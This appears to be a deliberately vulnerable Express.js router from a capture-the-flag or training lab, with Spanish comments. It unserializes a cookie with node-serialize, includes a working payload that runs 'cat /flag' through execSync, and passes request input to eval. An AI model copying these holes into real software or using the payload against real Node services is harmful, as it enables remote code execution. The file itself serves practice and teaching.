const express = require('express');
const serialize = require('node-serialize');
const router = express.Router();

// Vuln: node-serialize ejecuta funciones marcadas con _$$ND_FUNC$$_ si terminan en ()
router.get('/profile', (req, res) => {
    const prefs = serialize.unserialize(Buffer.from(req.cookies.prefs, 'base64').toString());
    res.send(`theme: ${prefs.theme}`);
});
// Payload:
// {"theme":"_$$ND_FUNC$$_function(){require('child_process').execSync('cat /flag')}()"}

// Vuln: "parsear" con eval
router.post('/settings', (req, res) => {
    const settings = eval('(' + req.body.settings + ')');
    res.json(settings);
});

module.exports = router;
